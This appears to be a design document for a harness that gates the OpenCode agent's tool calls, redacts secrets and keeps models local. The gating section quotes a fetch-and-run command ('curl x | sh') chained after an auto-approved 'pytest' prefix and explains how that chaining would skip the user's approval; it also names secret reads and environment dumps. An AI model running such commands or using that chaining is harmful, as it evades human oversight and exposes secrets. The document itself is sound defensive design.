# Module: OpenCode adapter and plugin shim

| File | Purpose |
|---|---|
| `crates/harness-cli/src/host/opencode_v1.rs` | The only Rust code that knows OpenCode: tool mapping, hook answers, `opencode.json` generation |
| `opencode-plugin/local-agent.ts` | The TypeScript shim OpenCode loads; forwards hooks to `agent hook <event>` |
| `opencode-plugin/package.json` | Exact pins: `@opencode-ai/plugin` 1.19.3, `typescript` 5.6.3, `@types/node` 18.19.130 |
| `crates/harness-cli/src/commands/hook.rs` | Process entry for hooks: stdin to `handle`, answer to stdout, event to the log |

Pinned host: OpenCode 1.19.3 (ADR-0001, R-33.2). On Windows it runs bash-tool commands in PowerShell
(`powershell -NoProfile -Command`) unless `SHELL` names another shell; the policy lexes commands the same way
([core-security.md](core-security.md)). A new OpenCode version means a new adapter module
(`opencode_v2.rs`), not edits scattered across the code.

## Hook protocol

The shim spawns `agent hook <event> --workspace <dir>`, writes one JSON payload to stdin, and reads one JSON answer
from stdout (20 s timeout). The command always exits 0 and always answers, even with a broken config.

| OpenCode hook | CLI event | Rust handler | Answer | If the harness cannot answer |
|---|---|---|---|---|
| `tool.execute.before` | `tool-before` | `tool_before` | `{action: allow\|block, message, class, verdict, rule}` | Blocked (the shim throws) |
| `tool.execute.after` | `tool-after` | `tool_after` | `{output}` when redaction changed it | Output withheld |
| `permission.ask` | `permission` | `permission` | `{status: allow\|deny, reason}` | `deny` (D3) |
| `shell.env` | `shell-env` | `shell_env` | `{set: {NAME: ""}}` blanks secret variables | Environment unchanged; the call is still gated by `tool-before` |
| `event` (6 lifecycle types) | `event` | `session_event` | `{}` | Ignored (telemetry only) |

Only six low-frequency events are forwarded (`session.created`, `session.idle`, `session.error`,
`session.compacted`, `file.edited`, `permission.replied`). Streaming events would spawn a process per token.

## Tool mapping (`map_tool_call`, `map_permission`)

OpenCode tool names become host-neutral `ToolRequest`s for `harness-core`:

| OpenCode tool | `ToolKind` |
|---|---|
| `read` | Read |
| `list` | List |
| `glob`, `grep`, `codesearch` | Search (a glob's base directory is its path) |
| `edit`, `multiedit` | Edit |
| `write` | Write |
| `patch`, `apply_patch` | Patch, with paths parsed from the patch headers |
| `bash` | Shell (command and `workdir`) |
| `webfetch`, `websearch` | WebFetch, WebSearch |
| `task` | Subagent |
| `todowrite`, `todoread`, `question`, `skill` | Todo |
| `local-agent_<tool>` (MCP) | `Harness(<tool>)`: `git_status`, `git_diff`, `harness_info` are READ_ONLY; `run_verification` is EXECUTE_SAFE (each step is checked inside the tool) |
| anything else | `Other(name)`: EXECUTE_RISKY, so blocked under the default verdicts |

File paths are collected from every argument name OpenCode uses (`filePath`, `file_path`, `path`, `filepath`).

Permission payloads: `bash` takes the command from metadata, then the pattern, then the title.
`external_directory` becomes a Read of the requested path, so the path guard decides.

## tool_before: the gate

1. Map the call and run `ToolPolicy::evaluate` ([core-security.md](core-security.md)).
2. Allow-pattern bypass: OpenCode does not ask the user when a command matches an auto-approved prefix. If the
   command matches one (`pytest*` matching `pytest && curl x | sh`) and the policy says Ask, the verdict becomes
   Deny with rule `allow_pattern_bypass`, and the model is told to run the risky step on its own.
3. Decision D3: only `Allow` passes. `Ask` is blocked, because under `--auto` OpenCode approves anything not denied.
4. The event is logged with the command redacted.

`BASH_ALLOW` (the generated auto-approve list) holds read-only and build/test prefixes such as `git status*`,
`cat *`, `grep *`, `pytest*`, `cargo test*`. Matching a prefix only skips OpenCode's own prompt. Every call still
goes through `tool_before`, which checks the arguments (so `cat .env` is denied by the `secret_file` rule).
`BASH_EXPLORE_ALLOW` is the read-only subset for the explore, review and deep agents.

## tool_after, permission, shell_env

- `tool_after` redacts the output when `security.secrets_redaction` is on and logs size, whether anything was
  redacted, and a 400-character preview of the redacted text. MCP results are already redacted by the server,
  because OpenCode does not show MCP output to this hook.
- `permission` maps Allow to `allow`, and Ask or Deny to `deny` (D3).
- `shell_env` returns every non-empty variable with a sensitive name, set to `""`. OpenCode merges the answer over the
  inherited environment, so the secret is removed from the shell.

- The reasons in a `tool_before` answer are redacted before they reach the model or the log (a blocked command
  can echo part of itself, such as `unrecognised program <word>`).

Open item: if `shell-env` fails, secrets stay in the shell environment. Commands that dump the environment (`env`,
`printenv`, `Get-ChildItem env:`) then rely on output redaction alone.

## opencode.json generation (`generate_opencode_config`)

One source of truth: the harness config produces `opencode.json` (C-11).

- One provider per model slot (`local-agent-main`, `local-agent-micro`, `local-agent-deep`), all OpenAI-compatible
  endpoints on `127.0.0.1`. `enabled_providers` lists only these, so OpenCode cannot fall back to a hosted model.
  `small_model` is the main model too, so titles and summaries also stay local.
- `share: disabled`, `autoupdate: false`.
- Agents:
  - `build`: the main model. Permissions: edit allow, read rules (secret files denied), bash `ask` by default plus
    the allow list, webfetch and websearch from `security.network`, external directories denied. `steps` is
    `max_iterations × 10`.
  - `explore`: read-only subagent (edit denied, read-only bash list, no web).
  - `review` and `deep`: generated when a slot has that role; they analyse and propose, and never edit (§18).
- MCP: `local-agent` runs `<agent.exe> mcp` over stdio. OpenCode applies `timeout` to every MCP request, so it is
  the sum of the verification step timeouts (steps run in turn), at least `git_diff`'s worst case (120 s), plus
  30 s.

## The shim (`local-agent.ts`)

- No policy logic: it forwards payloads and applies answers.
- `agent init` copies it to `.opencode/plugins/local-agent.ts` and replaces `__AGENT_BIN__` with the absolute path
  of `agent.exe`. `LOCAL_AGENT_BIN` overrides that at run time.
- The type import from `@opencode-ai/plugin` is erased at run time. `npm run typecheck` checks the shim against the
  pinned 1.19.3 types.
- On Windows, OpenCode must start with `HTTP_PROXY` and `HTTPS_PROXY` cleared, or plugin loading hangs
  ([troubleshooting.md](../troubleshooting.md)).

## Tests

- `crates/harness-cli/tests/hook_fixtures.rs`: 34 payloads through the real binary (secret reads via each allowed
  prefix, `allow_pattern_bypass`, Ask-class commands, malformed input, broken config, the `event` hook).
- Unit tests in `opencode_v1.rs`: tool mapping, wildcard matching, `ask_verdicts_are_blocked_not_allowed`,
  config generation.
- End to end on Windows with Qwen3.5-9B: the bug fix run, the `.env` read denial, and an MCP `git_status` call
  ([progress.md](../progress.md)).
